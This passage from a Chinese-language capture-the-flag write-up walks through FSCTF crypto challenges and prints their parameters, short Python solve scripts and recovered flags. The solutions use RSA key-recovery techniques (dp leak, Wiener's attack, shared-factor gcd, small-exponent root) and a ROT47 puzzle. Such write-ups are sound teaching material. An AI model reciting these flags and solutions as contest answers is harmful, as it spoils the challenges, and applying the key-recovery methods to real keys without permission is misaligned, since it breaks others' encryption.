¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ \n</code></pre>\n<blockquote>\n<p>阴阳怪气解密</p>\n</blockquote>\n<pre><code>FSCTF&#123;Jiuzhe@JustSoSo&#125;\n</code></pre>\n<h3 id=\"rsa-2\"><a class=\"markdownIt-Anchor\" href=\"#rsa-2\">#</a> RSA 2</h3>\n<pre><code>c=90362297576572826064831133206230135349790392078780406000643496612200873754835039374184323808342127071833274981191134125413478105835272238356352724573228797863805124195170088819735610736936895478614898105848968069280022022112207095140266709372221090586917729998024205978412679448008696923580889787529663283314\np=8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 \nq=11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407\ne=65537\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"rsa3\"><a class=\"markdownIt-Anchor\" href=\"#rsa3\">#</a> RSA3</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> bytes_to_long</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>m<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">12308543373374311860115195114269947739026255098864232126071500623399852788903738569949462616714391748269539072128882946132686996592089735285396762634029371785959865779256901123369306119124563405765293657606975290441243965513640680841871955014230301486214824204887945375140818283280272607903500556306646445508386218951500563603482945071727344737690804338144982687000734071274618240408238519378280819162796749148066754028700125846348589164721591354555019608871411236973606149388257533629388508942271702742078883636357856776193846813894734271905070538713351614750057245897158615891962167410053552739441195871000310777649</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>dp<span class=\"token operator\">=</span> <span class=\"token number\">28196759050232165736649945458463681080421101473761579424309687746007021074159564720195299959516638110870101025657932732247788828322476803386736345945717104030991724584628153257976163663460034720811420324255626233108130037584679035250792445830510130682783638394418531763109219293027733347554816808577799709553</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">1855798257044238280327042455832785889763141234883180404158555071443088630113034033050409259513632343742665544043437830959750873431928980910236398026670945184328950692568113819821699696418438157336263799808404698795433243968536256780396910914692949484556950491722527661706255009863481905590371725089587377065000354109396062360440021447607401687082247775453369117424848927386857425051097931983703966253652921113920387008048024308793686643944404541941182997963873579988680965558581885273185721576668001462817150245955628293258512024323515581063235248627223179117549540541642185815489978089367061102920114395871329023208</span></pre></td></tr></table></figure><blockquote>\n<p>dp 泄露</p>\n</blockquote>\n<p><img data-src=\"/img/fsctfwppic/2.png\" alt=\"image-20231024081420584\"></p>\n<h3 id=\"big_e\"><a class=\"markdownIt-Anchor\" href=\"#big_e\">#</a> Big_e</h3>\n<pre><code>n = 12238605063252292170613110607692779326628090745751955692266649177882959231822580682548279800443278979485092243645806337103841086023159482786712759291169541633901936290854044069486201989034158882661270017305064348254800318759062921744741432214818915527537124001063995865927527037625277330117588414586505635959411443039463168463608235165929831344586283875119363703480280602514451713723663297066810128769907278246434745483846869482536367912810637275405943566734099622063142293421936734750356828712268385319217225803602442033960930413469179550331907541244416573641309943913383658451409219852933526106735587605884499707827\ne=  11850552481503020257392808424743510851763548184936536180317707155841959788151862976445957810691568475609821000653594584717037528429828330763571556164988619635320288125983463358648887090031957900011546300841211712664477474767941406651977784177969001025954167441377912326806132232375497798238928464025466905201977180541053129691501120197010080001677260814313906843670652972019631997467352264392296894192998971542816081534808106792758008676039929763345402657578681818891775091140555977382868531202964486261123748663752490909455324860302967636149379567988941803701512680099398021640317868259975961261408500449965277690517\nc=4218884541887711839568615416673923480889604461874475071333225389075770098726337046768413570546617180777109293884545400260353306419150066928226964662256930702466709992997796154415790565112167663547017839870351167884417142819504498662037048412313768450136617389372395690363188005647619061128497371121168347810294424378348301835826084732747005110258557662466626720961279087145559906371505117097599774430970980355531235913439823966628008554872896820907555353892843539526041019103819804854883231421963308265517622470779089941078841902464033685762524196275032288319744157255628189204988632871276637699312750636348750883054\n\n\n请解出明文！！！\n</code></pre>\n<blockquote>\n<p>维纳攻击</p>\n</blockquote>\n<p><img data-src=\"/img/fsctfwppic/3.png\" alt=\"image-20231024081609249\"></p>\n<h3 id=\"do-you-know-gcd\"><a class=\"markdownIt-Anchor\" href=\"#do-you-know-gcd\">#</a> Do you know gcd</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m1<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m2<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q1<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q2<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n1<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q1</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>n2<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q2</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>c1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>c2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n1=\"</span><span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n2=\"</span><span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c1=\"</span><span class=\"token punctuation\">,</span>c1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c2=\"</span><span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>n1= 18680935400842120133090782991548100098299141114788036098274292600814484762178879421175852824971602717084073867867453382415307589970440719890918576225495401632854107018246844209327118177917122236073227158593514362850629722223228335334773008682775987859295083444638923726449899310854161394586430943134469559429878238769266114132469166535509030877235272476877484918308883799496627699789051809542538091061550107526246728583019140703765888157806778516567048103700384849598143249322109207879381251223776896702362630437178664824125387477797876186939235800859102380783259361745143574493440078787931593394188675093506492640857</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n2= 16308523133405725830120564525574438512803584148781960516042054284309437381876822602134185065101371986717984978566359252072738078020261823966208153922611063201149105749778596739692554295573408850719208215646167050188830459343054219856901871953140988948482577813730729085764541988120049026971705499798003225755018687242522370406495429425494022876627543617474873929054728724093702291448754458748923218635900061398716191201846139296921753782690468189409101899415028480878296408735247604084627019116374444335509072590669239349212479592499426230525792270750612371117196200786891891430446212938482959351978202358044864822577</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c1= 534518909595318304521410713148076850830155521838755402438490325620155197496935820831936109252194297244161393310730073882257949954815312409974998733265641354273665213856408848764503848122264972023143474923678585167025591255034150826271791019266426616987355463111138963331008761826310757292765842789380409826387579098421126952331558360737102888876551724241978020305977032047901621477384392409864427091911872691182528938458750707982564581322551517287491916691010743390992018974168703956622998928457142606354825714033609199676987795174032254878017883605565760275857658822315970522114838062469258676628619381342357632179</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>c2= 10248394002302905069278122013496854496130190499518622376819239887579692634750808499513497018453473232140518824608976734237637842228035017757831938865937098325684711995382081489403971465596662585196007547659143066184546400992333479193424580690897692586491475768279754939199148642035267049092880715299621206567123356521609120801306358100326600900326310677054810032471472266402660807205675696110133573150125117412696328434523507708110949743705536889950671778501402435457354251761692098671783596194430798692942013503015764266392551048702428063161786512924608239609802040937400619384828550050291094616346317726139970219621</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>n1<span class=\"token operator\">=</span> <span class=\"token number\">18680935400842120133090782991548100098299141114788036098274292600814484762178879421175852824971602717084073867867453382415307589970440719890918576225495401632854107018246844209327118177917122236073227158593514362850629722223228335334773008682775987859295083444638923726449899310854161394586430943134469559429878238769266114132469166535509030877235272476877484918308883799496627699789051809542538091061550107526246728583019140703765888157806778516567048103700384849598143249322109207879381251223776896702362630437178664824125387477797876186939235800859102380783259361745143574493440078787931593394188675093506492640857</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>n2<span class=\"token operator\">=</span> <span class=\"token number\">16308523133405725830120564525574438512803584148781960516042054284309437381876822602134185065101371986717984978566359252072738078020261823966208153922611063201149105749778596739692554295573408850719208215646167050188830459343054219856901871953140988948482577813730729085764541988120049026971705499798003225755018687242522370406495429425494022876627543617474873929054728724093702291448754458748923218635900061398716191201846139296921753782690468189409101899415028480878296408735247604084627019116374444335509072590669239349212479592499426230525792270750612371117196200786891891430446212938482959351978202358044864822577</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c1<span class=\"token operator\">=</span> <span class=\"token number\">534518909595318304521410713148076850830155521838755402438490325620155197496935820831936109252194297244161393310730073882257949954815312409974998733265641354273665213856408848764503848122264972023143474923678585167025591255034150826271791019266426616987355463111138963331008761826310757292765842789380409826387579098421126952331558360737102888876551724241978020305977032047901621477384392409864427091911872691182528938458750707982564581322551517287491916691010743390992018974168703956622998928457142606354825714033609199676987795174032254878017883605565760275857658822315970522114838062469258676628619381342357632179</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c2<span class=\"token operator\">=</span> <span class=\"token number\">10248394002302905069278122013496854496130190499518622376819239887579692634750808499513497018453473232140518824608976734237637842228035017757831938865937098325684711995382081489403971465596662585196007547659143066184546400992333479193424580690897692586491475768279754939199148642035267049092880715299621206567123356521609120801306358100326600900326310677054810032471472266402660807205675696110133573150125117412696328434523507708110949743705536889950671778501402435457354251761692098671783596194430798692942013503015764266392551048702428063161786512924608239609802040937400619384828550050291094616346317726139970219621</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> gcd<span class=\"token punctuation\">(</span>n1<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q1 <span class=\"token operator\">=</span> n1<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q2 <span class=\"token operator\">=</span> n2<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>phi1<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q1<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>phi2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q2<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>d1<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>d2<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>d1<span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>d2<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"埃塞克的秘密\"><a class=\"markdownIt-Anchor\" href=\"#埃塞克的秘密\">#</a> 埃塞克的秘密</h3>\n<pre><code>埃塞克先生将自己的秘密藏在盒子里并交给了ROT保管，埃塞克先生在盒子上留下了这样一串数字：\n117 36 114 37 117 76 37 57 111 63 60 48 74 64 70 78\n</code></pre>\n<p>转 ascii 码后，ROT47</p>\n<pre><code>FSCTF&#123;Th@nk_you&#125;\n</code></pre>\n<h3 id=\"rsa签到\"><a class=\"markdownIt-Anchor\" href=\"#rsa签到\">#</a> RSA 签到</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">assert</span> m<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">150</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>kbits <span class=\"token operator\">=</span> <span class=\"token number\">103</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>m <span class=\"token operator\">>></span> kbits<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> kbits</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Mod <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">2048</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>hint1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2019</span><span class=\"token operator\">-</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> Mod</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>hint2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2023</span><span class=\"token punctuation\">,</span> Mod<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'n ='</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'c ='</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hint1 ='</span><span class=\"token punctuation\">,</span>hint1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hint2 ='</span><span class=\"token punctuation\">,</span>hint2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n = 113369575322962228640839640796005129142256499725384495463316595604047079557930666699058024217561098997292782305151595366764483672240871690818579470888054811186902762990032505953330034837625667158114251720321766235335996441613828302393569643827293040591156144187232255906107532680524431761932215860898533224303</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c = 42336544435252811021843650684098817755849747192874682997240960601474927692351510022965782272751339319782351146077580929125</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>hint1 = 23620186624579054670890922956929031966199853422018331906359817627553015939570302421768667351617160816651880338639432052134891008193969801696035505565684982786461527274477933881508678074157199742425764746919878452990468268098540220237611917321213668069666526658025737487539455262610713002399515462380573732082344497124344090365729168706760425585735014513373401622860196569544933971210142724734536588173957576667830667503151362930889494877201597267000737408071228466811160470759093928003064486766171850080985758351203536462206720715743059101285822169971058423075796415932349942113371706910521251120400151508125606778268</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>hint2 = 963121833542317369601573845406471251262548645428284526828835768327851746644612875378048462019053502788803516653832734212104068969204751285764221918179043624419894139984279754512017898273159626328827668380262481220865017731267802600915375183179264380651165421367773563947903391466768557089792263481734108493385146063258300495764165365295546337808852673629710735621386935094923561594142327134318905856137785813985574356271679918694447015294481691849341917432346559501502683303082591585074576786963085039546446281095048723669230856548339087909922753762884060607659880382812905450025751549153093939827557015748608</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#小明文攻击</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">113369575322962228640839640796005129142256499725384495463316595604047079557930666699058024217561098997292782305151595366764483672240871690818579470888054811186902762990032505953330034837625667158114251720321766235335996441613828302393569643827293040591156144187232255906107532680524431761932215860898533224303</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">42336544435252811021843650684098817755849747192874682997240960601474927692351510022965782272751339319782351146077580929125</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>hint1 <span class=\"token operator\">=</span> <span class=\"token number\">23620186624579054670890922956929031966199853422018331906359817627553015939570302421768667351617160816651880338639432052134891008193969801696035505565684982786461527274477933881508678074157199742425764746919878452990468268098540220237611917321213668069666526658025737487539455262610713002399515462380573732082344497124344090365729168706760425585735014513373401622860196569544933971210142724734536588173957576667830667503151362930889494877201597267000737408071228466811160470759093928003064486766171850080985758351203536462206720715743059101285822169971058423075796415932349942113371706910521251120400151508125606778268</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>hint2 <span class=\"token operator\">=</span> <span class=\"token number\">963121833542317369601573845406471251262548645428284526828835768327851746644612875378048462019053502788803516653832734212104068969204751285764221918179043624419894139984279754512017898273159626328827668380262481220865017731267802600915375183179264380651165421367773563947903391466768557089792263481734108493385146063258300495764165365295546337808852673629710735621386935094923561594142327134318905856137785813985574356271679918694447015294481691849341917432346559501502683303082591585074576786963085039546446281095048723669230856548339087909922753762884060607659880382812905450025751549153093939827557015748608</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>m<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag<span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezrsa\"><a 